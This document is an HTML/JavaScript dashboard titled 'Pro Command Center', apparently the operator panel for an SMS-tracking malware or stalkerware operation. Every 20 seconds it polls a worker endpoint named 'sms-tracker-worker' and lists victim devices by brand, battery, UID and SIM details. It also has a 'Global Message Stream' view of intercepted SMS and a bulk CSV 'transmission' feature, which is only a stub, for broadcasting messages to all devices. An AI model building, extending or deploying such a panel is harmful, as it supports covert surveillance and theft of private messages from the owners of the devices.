<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Command Center v3.0</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <style>
        :root {
            --bg: #050505;
            --card: #121212;
            --green: #00ff88;
            --red: #ff3366;
            --blue: #00ccff;
            --pink: #ff00ff;
            --yellow: #ffcc00;
            --glass: rgba(255, 255, 255, 0.05);
        }

        * { box-sizing: border-box; transition: all 0.3s ease; }
        body { 
            background: var(--bg); 
            color: #e0e0e0; 
            font-family: 'Segoe UI', sans-serif; 
            margin: 0; 
            padding-bottom: 80px; /* Mobile bottom nav space */
        }

        /* --- UI Elements --- */
        .container { padding: 20px; max-width: 1200px; margin: auto; }
        
        .header {
            background: var(--glass);
            backdrop-filter: blur(10px);
            padding: 15px;
            border-radius: 15px;
            border-bottom: 2px solid var(--blue);
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }

        .status-badge {
            background: rgba(0, 255, 136, 0.1);
            color: var(--green);
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            border: 1px solid var(--green);
        }

        /* --- Device Cards --- */
        .device-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }

        .device-card {
            background: var(--card);
            border-radius: 15px;
            padding: 20px;
            border-left: 5px solid var(--pink);
            position: relative;
            overflow: hidden;
        }

        .device-card:hover { transform: translateY(-5px); border-color: var(--blue); }

        .battery-bar {
            height: 4px;
            background: #333;
            width: 100%;
            margin-top: 10px;
            border-radius: 2px;
        }

        .battery-fill { height: 100%; border-radius: 2px; }

        /* --- Bottom Mobile Nav --- */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: rgba(10, 10, 10, 0.95);
            display: flex;
            justify-content: space-around;
            padding: 15px;
            border-top: 1px solid var(--glass);
            backdrop-filter: blur(15px);
            z-index: 100;
        }

        .nav-btn { color: #888; text-decoration: none; font-size: 1.2rem; cursor: pointer; }
        .nav-btn:hover, .nav-btn.active { color: var(--blue); text-shadow: 0 0 10px var(--blue); }

        /* --- Popup / Modal Style --- */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: #1a1a1a;
            width: 90%;
            max-width: 500px;
            margin: 10% auto;
            border-radius: 20px;
            padding: 25px;
            border: 1px solid var(--glass);
            position: relative;
            animation: slideUp 0.4s ease;
        }

        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .close-btn { position: absolute; right: 20px; top: 15px; font-size: 1.5rem; cursor: pointer; color: var(--red); }

        /* --- Buttons --- */
        .btn-pro {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        .btn-blue { background: linear-gradient(45deg, var(--blue), #0055ff); color: white; }
        .btn-pink { background: linear-gradient(45deg, var(--pink), #880088); color: white; }

        .sms-row { background: #222; padding: 10px; border-radius: 8px; margin-bottom: 10px; border-right: 3px solid var(--yellow); }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div>
                <h2 style="margin:0; color:var(--blue)">PRO TERMINAL</h2>
                <small id="syncTime" style="color:#666">Last Sync: Just now</small>
            </div>
            <div id="mainStatus" class="status-badge">SYSTEM LIVE</div>
        </div>

        <div id="deviceGrid" class="device-grid">
            <p style="text-align: center; width: 100%;">Syncing with cloud satellite...</p>
        </div>
    </div>

    <div class="bottom-nav">
        <div class="nav-btn active" onclick="fetchData()"><i class="fas fa-sync"></i></div>
        <div class="nav-btn" onclick="showModal('smsModal')"><i class="fas fa-envelope"></i></div>
        <div class="nav-btn" onclick="showModal('csvModal')"><i class="fas fa-file-csv"></i></div>
        <div class="nav-btn" onclick="alert('Emergency Lock Engaged!')"><i class="fas fa-shield-alt" style="color:var(--red)"></i></div>
    </div>

    <div id="csvModal" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="closeModal('csvModal')">&times;</span>
            <h3 style="color:var(--blue)"><i class="fas fa-file-csv"></i> Bulk CSV Upload</h3>
            <p style="color:#888">Select .csv file to transmit messages to all active devices.</p>
            <input type="file" id="csvFile" style="color:var(--yellow); margin: 20px 0;">
            <button class="btn btn-pro btn-blue" onclick="processCSV()">START TRANSMISSION</button>
        </div>
    </div>

    <div id="smsModal" class="modal">
        <div class="modal-content" style="max-width: 600px;">
            <span class="close-btn" onclick="closeModal('smsModal')">&times;</span>
            <h3 style="color:var(--yellow)"><i class="fas fa-comment-dots"></i> Global Message Stream</h3>
            <div id="smsList" style="max-height: 400px; overflow-y: auto; padding-right: 5px;">
                <p>No new transmissions detected.</p>
            </div>
        </div>
    </div>

    <script>
        const WORKER_URL = 'https://sms-tracker-worker.vikash6759ub.workers.dev';

        async function fetchData() {
            const grid = document.getElementById('deviceGrid');
            const status = document.getElementById('mainStatus');
            
            status.innerHTML = "SYNCING...";
            status.style.borderColor = "var(--yellow)";
            status.style.color = "var(--yellow)";

            try {
                const res = await fetch(`${WORKER_URL}/api/get-data`);
                const data = await res.json();
                
                grid.innerHTML = data.map(d => {
                    const batt = parseInt(d.battery) || 0;
                    const battColor = batt < 20 ? 'var(--red)' : 'var(--green)';
                    return `
                        <div class="device-card">
                            <div style="display:flex; justify-content:space-between">
                                <b style="color:var(--blue)">${d.brand || 'Unknown'}</b>
                                <span style="color:${battColor}">${batt}% <i class="fas fa-battery-half"></i></span>
                            </div>
                            <p style="font-size:0.8rem; margin:10px 0; color:#888">UID: ${d.id.substring(0,15)}...</p>
                            <div style="color:var(--yellow); font-weight:bold">${d.sim_info}</div>
                            <div class="battery-bar">
                                <div class="battery-fill" style="width:${batt}%; background:${battColor}"></div>
                            </div>
                            <button class="btn-pro btn-pink" style="font-size:0.7rem; margin-top:15px;" onclick="showModal('smsModal')">VIEW LOGS</button>
                        </div>
                    `;
                }).join('');

                status.innerHTML = "SYSTEM LIVE";
                status.style.borderColor = "var(--green)";
                status.style.color = "var(--green)";
                document.getElementById('syncTime').innerText = "Last Sync: " + new Date().toLocaleTimeString();

            } catch (e) {
                status.innerHTML = "OFFLINE";
                status.style.borderColor = "var(--red)";
                status.style.color = "var(--red)";
            }
        }

        function showModal(id) { document.getElementById(id).style.display = 'block'; }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }

        function processCSV() {
            const file = document.getElementById('csvFile').files[0];
            if(!file) return alert("Please select a CSV file first!");
            alert("CSV Uploaded! Initializing broadcast protocol...");
            closeModal('csvModal');
        }

        // Auto Load
        fetchData();
        // Refresh every 20 seconds
        setInterval(fetchData, 20000);
    </script>
</body>
</html>
